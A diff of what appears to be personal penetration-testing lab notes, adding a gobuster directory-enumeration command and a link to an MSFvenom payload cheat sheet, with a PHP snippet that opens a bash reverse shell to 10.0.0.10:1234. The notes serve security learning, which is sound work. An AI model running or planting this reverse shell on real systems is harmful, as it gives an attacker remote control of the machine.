@@ -27,9 +27,18 @@ sudo openvpn --config ./Desktop/yufujioka.ovpn
 
 - [MSFvenom ~ ペイロード早見表 ~](https://qiita.com/mr-wacker/items/0ec926951ffa5a4d197c)
 
+### Directory Enumlation
+
+- Gobuster options
+  - [Gobuster Cheatsheet](https://redteamtutorials.com/2018/11/19/gobuster-cheatsheet/)
+- quick play
+```
+gobuster dir -t 100 -u http://url -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o outfile
+```
+
 ### Reverse Shell
 
-- [A tiny PHP/bash reverse shell.](https://gist.github.com/rshipp/eee36684db07d234c1cc#gistcomment-3100663)
+- [A tiny PHP/bash reverse shell.](https://gist.github.com/rshipp/eee36684db07d234c1cc)
 ```php
 <?php
 exec("/bin/bash -c 'bash -i > /dev/tcp/10.0.0.10/1234 0>&1'");
